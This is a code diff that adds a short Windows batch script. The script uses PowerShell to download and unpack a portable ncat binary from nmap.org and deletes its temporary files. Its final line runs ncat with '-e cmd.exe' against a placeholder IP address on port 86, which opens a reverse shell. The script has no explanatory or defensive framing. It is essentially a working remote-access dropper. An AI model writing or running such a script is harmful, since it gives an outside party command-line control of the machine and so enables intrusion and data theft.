@@ -1,0 +1,19 @@
+@echo off
+:: Set download URL
+set DownloadUrl=https://nmap.org/dist/ncat-portable-5.59BETA1.zip
+set CurrentDir=%CD%
+set TempZip=%CurrentDir%\ncat-portable.zip
+
+:: Download ncat.zip
+powershell -Command "Invoke-WebRequest -Uri %DownloadUrl% -OutFile %TempZip%"
+
+:: Extract it
+powershell -Command "Expand-Archive -Path %TempZip% -DestinationPath %CurrentDir% -Force"
+
+:: Move it in another files
+move "%CurrentDir%\ncat-portable-5.59BETA1\ncat.exe" "%CurrentDir%\ncat.exe"
+
+:: Delete temporary files
+rd /s /q "%CurrentDir%\ncat-portable-5.59BETA1"
+del /q %TempZip%
+ncat IPAddress 86 -e cmd.exe
